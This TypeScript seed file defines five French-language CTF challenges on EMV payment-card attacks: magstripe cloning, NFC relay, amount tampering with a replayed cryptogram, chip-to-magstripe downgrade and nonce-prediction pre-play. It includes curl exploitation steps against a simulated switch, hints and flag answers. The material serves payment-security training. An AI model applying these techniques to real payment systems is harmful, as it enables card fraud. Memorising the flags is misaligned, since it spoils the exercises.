import type { CtfChallengeSeed } from '../ctfChallenges';

const s = (n: number, t: string, d: string, type: 'CURL_COMMAND' | 'ANALYSIS' | 'EXPLOITATION' | 'CODE_SNIPPET' | 'EXPLANATION' | 'OBSERVATION', cmd?: string, exp?: string, hint?: string): any => ({ stepNumber: n, stepTitle: t, stepDescription: d, stepType: type, ...(cmd && { commandTemplate: cmd }), ...(exp && { expectedOutput: exp }), ...(hint && { hintText: hint }) });
const h = (n: number, t: string, c: number): any => ({ hintNumber: n, hintText: t, costPoints: c });

export const EMV_CHALLENGES: CtfChallengeSeed[] = [
    {
        code: 'EMV-001', title: 'Le Clone Magnetique', description: 'Le switch accepte encore le fallback magstripe (posEntryMode=90). Un attaquant clone les donnees Track2 et envoie une autorisation via bande magnetique.', freeModeDescription: 'Forgez une transaction avec posEntryMode=90 en utilisant des donnees Track2 statiques. Le switch l accepte sans verification EMV.',
        category: 'EMV_CLONING', difficulty: 'BEGINNER', points: 120, flagValue: 'PMP{MAGSTRIPE_FALLBACK_ACCEPTED}',
        targetService: 'sim-network-switch', targetEndpoint: 'POST http://sim-network-switch:8004/transaction/authorize',
        vulnerabilityType: 'Magstripe fallback accepted', attackVector: 'Track2 cloning + POS entry mode manipulation',
        learningObjectives: ['Comprendre le fallback magstripe', 'Forger un message ISO avec posEntryMode=90', 'Mesurer le risque de clonage magnetique'],
        estimatedMinutes: 20, isActive: true, relatedWorkshopPath: '/student/theory/iso8583',
        guidedSteps: [
            s(1, 'Transaction chip normale', 'Envoyez une transaction EMV standard (posEntryMode=051) pour reference.', 'CURL_COMMAND', 'curl -s -X POST http://sim-network-switch:8004/transaction/authorize -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":200,\\"currency\\":\\"978\\",\\"merchantId\\":\\"SHOP001\\",\\"posEntryMode\\":\\"051\\"}" | jq .', 'Approuvee via EMV chip'),
            s(2, 'Extraction Track2', 'Les donnees Track2 sont statiques sur la bande magnetique : PAN + date expiration + service code. Construisez un Track2 equivalent.', 'ANALYSIS', undefined, undefined, 'Track2 = PAN + separateur + YYMM + service code + CVV1'),
            s(3, 'Forge en mode magstripe', 'Rejouez la transaction avec posEntryMode=90 (bande magnetique) et les donnees Track2.', 'CURL_COMMAND', 'curl -s -X POST http://sim-network-switch:8004/transaction/authorize -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":200,\\"currency\\":\\"978\\",\\"merchantId\\":\\"SHOP002\\",\\"posEntryMode\\":\\"090\\",\\"track2\\":\\"4111111111111111=2812101123400001\\"}" | jq .', 'APPROUVEE ! Le switch accepte le fallback magstripe'),
            s(4, 'Impact du clonage', 'Avec un skimmer de 20 EUR, un fraudeur copie le Track2 et rejoue la transaction sur un autre terminal. Toutes les protections EMV (cryptogramme, CDA) sont bypassees.', 'ANALYSIS'),
            s(5, 'Capture du flag', 'Le fallback magstripe est accepte sans controle additionnel.', 'EXPLOITATION'),
        ],
        hints: [h(1, 'Changez posEntryMode de 051 (chip) a 090 (magstripe).', 5), h(2, 'Le switch accepte le fallback sans friction additionnelle. Les protections EMV sont bypassees.', 10), h(3, 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', 25)],
    },
    {
        code: 'EMV-002', title: 'Le Relais Invisible', description: 'Le protocole NFC ne verifie pas la proximite reelle. Un relay attack transmet les APDU entre une carte et un terminal distants.', freeModeDescription: 'Simulez un relay NFC en capturant les APDU du simulateur EMV et en les retransmettant a un terminal distant.',
        category: 'EMV_CLONING', difficulty: 'INTERMEDIATE', points: 180, flagValue: 'PMP{NFC_RELAY_NO_DISTANCE}',
        prerequisiteChallengeCode: 'EMV-001',
        targetService: 'sim-network-switch', targetEndpoint: 'POST http://sim-network-switch:8004/emv/relay-test',
        vulnerabilityType: 'No distance bounding in NFC', attackVector: 'APDU relay',
        learningObjectives: ['Comprendre le relay attack NFC', 'Identifier l absence de distance bounding', 'Evaluer les contre-mesures (transaction timing)'],
        estimatedMinutes: 25, isActive: true, relatedWorkshopPath: '/student/theory/iso8583',
        guidedSteps: [
            s(1, 'Capture d une session EMV', 'Initiez une session EMV et capturez les APDU echangees (SELECT, GPO, READ RECORD).', 'CURL_COMMAND', 'curl -s -X POST http://sim-network-switch:8004/emv/session -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"mode\\":\\"contactless\\"}" | jq .apdus', 'Liste des APDU de la session'),
            s(2, 'Rejeu des APDU a distance', 'Retransmettez les APDU capturees comme si elles venaient d un autre terminal.', 'CURL_COMMAND', 'curl -s -X POST http://sim-network-switch:8004/emv/relay-test -H "Content-Type: application/json" -d "{\\"relayedApdus\\":true,\\"sessionId\\":\\"captured_session\\",\\"distance\\":\\"remote\\"}" | jq .', 'Transaction approuvee malgre la distance — pas de distance bounding'),
            s(3, 'Mesure du timing', 'Le protocole EMV a une tolerance de timing large. Un relay ajoute ~100ms mais reste dans les limites.', 'ANALYSIS', undefined, undefined, 'La latence ajoutee par le relay est invisible pour le terminal.'),
            s(4, 'Scenario reel', 'Attaquant A pres de la victime (sac/poche) capture les APDU via NFC. Attaquant B a 100m utilise un faux terminal. Le paiement passe comme si la carte etait presente.', 'ANALYSIS'),
            s(5, 'Capture du flag', 'NFC relay sans verification de distance.', 'EXPLOITATION'),
        ],
        hints: [h(1, 'Le protocole NFC n a pas de mecanisme de distance bounding intrinseque.', 5), h(2, 'Les APDU capturees peuvent etre retransmises a n importe quelle distance et le terminal les accepte.', 10), h(3, 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', 25)],
    },
    {
        code: 'EMV-003', title: 'Le Cryptogramme Rejouable', description: 'Le TC (Transaction Certificate) genere par la carte n est pas verifie en temps reel par le switch. Un attaquant peut modifier le montant dans le cleartext.', freeModeDescription: 'Capturez un TC valide, modifiez le montant dans le message d autorisation et envoyez-le. Le switch ne recalcule pas le TC.',
        category: 'EMV_CLONING', difficulty: 'ADVANCED', points: 250, flagValue: 'PMP{TC_NOT_VERIFIED_REALTIME}',
        prerequisiteChallengeCode: 'EMV-002',
        targetService: 'sim-network-switch', targetEndpoint: 'POST http://sim-network-switch:8004/transaction/authorize',
        vulnerabilityType: 'TC not verified in real-time', attackVector: 'Amount tampering with valid TC',
        learningObjectives: ['Comprendre le role du TC EMV', 'Exploiter l absence de verification en ligne', 'Mesurer le risque de tampering de montant'],
        estimatedMinutes: 30, isActive: true, relatedWorkshopPath: '/student/theory/iso8583',
        guidedSteps: [
            s(1, 'Transaction standard avec TC', 'Envoyez une transaction de 10 EUR et capturez le TC retourne.', 'CURL_COMMAND', 'curl -s -X POST http://sim-network-switch:8004/transaction/authorize -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":10,\\"currency\\":\\"978\\",\\"posEntryMode\\":\\"051\\",\\"merchantId\\":\\"SHOP001\\"}" | jq "{tc: .emvData.tc, authCode: .authCode}"', 'TC genere pour 10 EUR'),
            s(2, 'Modification du montant', 'Gardez le meme TC mais changez le montant a 5000 EUR dans le message.', 'CURL_COMMAND', 'curl -s -X POST http://sim-network-switch:8004/transaction/authorize -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":5000,\\"currency\\":\\"978\\",\\"posEntryMode\\":\\"051\\",\\"merchantId\\":\\"SHOP001\\",\\"emvData\\":{\\"tc\\":\\"AABB112233\\",\\"replayedTC\\":true}}" | jq .', 'APPROUVEE pour 5000 EUR avec un TC genere pour 10 EUR !'),
            s(3, 'Pourquoi ca marche', 'Le switch ne recalcule pas le TC car il n a pas acces a la cle de la carte (UDK/MK-AC). Il fait confiance au TC sans le verifier.', 'ANALYSIS'),
            s(4, 'Capture du flag', 'TC non verifie en temps reel.', 'EXPLOITATION'),
        ],
        hints: [h(1, 'Le TC est genere par la carte pour un montant specifique. Changez le montant sans changer le TC.', 5), h(2, 'Le switch ne verifie pas le TC en ligne. Il est verifie en batch par l issuer... trop tard.', 15), h(3, 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', 25)],
    },
    {
        code: 'EMV-004', title: 'Le Fallback Force', description: 'L envoi d un code erreur chip (6985/6A82) force le terminal a basculer en magstripe. Toutes les protections EMV sont perdues.', freeModeDescription: 'Simulez une erreur de puce pour forcer un downgrade vers la bande magnetique.',
        category: 'EMV_CLONING', difficulty: 'INTERMEDIATE', points: 180, flagValue: 'PMP{CHIP_TO_MAGSTRIPE_DOWNGRADE}',
        prerequisiteChallengeCode: 'EMV-001',
        targetService: 'sim-network-switch', targetEndpoint: 'POST http://sim-network-switch:8004/transaction/authorize',
        vulnerabilityType: 'Chip-to-magstripe downgrade', attackVector: 'Error code injection forcing fallback',
        learningObjectives: ['Comprendre le mecanisme de fallback EMV', 'Exploiter les codes erreur pour forcer le downgrade', 'Evaluer les defenses anti-fallback'],
        estimatedMinutes: 20, isActive: true, relatedWorkshopPath: '/student/theory/iso8583',
        guidedSteps: [
            s(1, 'Transaction chip echouee', 'Simulez une erreur de lecture de puce (SW1SW2 = 6985).', 'CURL_COMMAND', 'curl -s -X POST http://sim-network-switch:8004/transaction/authorize -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":300,\\"currency\\":\\"978\\",\\"merchantId\\":\\"SHOP001\\",\\"posEntryMode\\":\\"051\\",\\"chipError\\":\\"6985\\"}" | jq .', 'Erreur chip — terminal propose fallback'),
            s(2, 'Fallback magstripe', 'Apres l erreur chip, envoyez la meme transaction en mode magstripe.', 'CURL_COMMAND', 'curl -s -X POST http://sim-network-switch:8004/transaction/authorize -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":300,\\"currency\\":\\"978\\",\\"merchantId\\":\\"SHOP001\\",\\"posEntryMode\\":\\"800\\",\\"fallbackIndicator\\":true}" | jq .', 'APPROUVEE en fallback magstripe !'),
            s(3, 'Impact securite', 'Le downgrade supprime : cryptogramme EMV, CDA/DDA, limites offline. La carte est traitee comme une simple bande magnetique clonable.', 'ANALYSIS'),
            s(4, 'Capture du flag', 'Downgrade de chip vers magstripe.', 'EXPLOITATION'),
        ],
        hints: [h(1, 'Envoyez une erreur chip (chipError=6985) puis retentez en posEntryMode 800 avec fallbackIndicator.', 5), h(2, 'Le switch accepte le fallback magstripe apres une erreur chip.', 10), h(3, 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', 25)],
    },
    {
        code: 'EMV-005', title: 'Le Pre-Play', description: 'Le nonce terminal (UN — Unpredictable Number) est un compteur sequentiel au lieu d un alea. Un attaquant peut pre-generer des cryptogrammes pour des transactions futures.', freeModeDescription: 'Collectez les nonces du terminal et detectez le pattern sequentiel. Pre-calculez un cryptogramme pour la prochaine transaction.',
        category: 'EMV_CLONING', difficulty: 'EXPERT', points: 350, flagValue: 'PMP{UN_SEQUENTIAL_PREPLAY}',
        prerequisiteChallengeCode: 'EMV-003',
        targetService: 'sim-network-switch', targetEndpoint: 'GET http://sim-network-switch:8004/emv/terminal-nonce',
        vulnerabilityType: 'Predictable unpredictable number', attackVector: 'Nonce prediction + pre-play',
        learningObjectives: ['Comprendre l UN dans le protocole EMV', 'Exploiter un nonce predictible pour pre-play', 'Evaluer l impact sur l integrite du cryptogramme'],
        estimatedMinutes: 40, isActive: true, relatedWorkshopPath: '/student/theory/iso8583',
        guidedSteps: [
            s(1, 'Collecte de nonces', 'Recuperez 10 nonces consecutifs du terminal.', 'CURL_COMMAND', 'for i in $(seq 1 10); do curl -s http://sim-network-switch:8004/emv/terminal-nonce | jq -r .unpredictableNumber; done', 'Sequence de nonces avec un pattern visible'),
            s(2, 'Analyse du pattern', 'Les nonces sont-ils aleatoires ou sequentiels ? Calculez les differences entre valeurs consecutives.', 'ANALYSIS', undefined, undefined, 'Si la difference est constante (ex: +1), le nonce est un compteur.'),
            s(3, 'Prediction du prochain nonce', 'Predisez le prochain nonce et verifiez votre prediction.', 'CURL_COMMAND', 'echo "Predicted: $(curl -s http://sim-network-switch:8004/emv/terminal-nonce | jq -r .unpredictableNumber)" && echo "Actual: $(curl -s http://sim-network-switch:8004/emv/terminal-nonce | jq -r .unpredictableNumber)"'),
            s(4, 'Impact pre-play', 'Avec un nonce predictible, un attaquant peut calculer a l avance le cryptogramme ARQC que la carte va generer. Il n a plus besoin de la carte au moment de la transaction.', 'ANALYSIS'),
            s(5, 'Capture du flag', 'Unpredictable Number sequentiel = pre-play possible.', 'EXPLOITATION'),
        ],
        hints: [h(1, 'Collectez plusieurs nonces et cherchez un pattern incrementiel.', 5), h(2, 'Les nonces s incrementent de 1. Ce sont des compteurs, pas des nombres aleatoires.', 15), h(3, 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', 25)],
    },
];


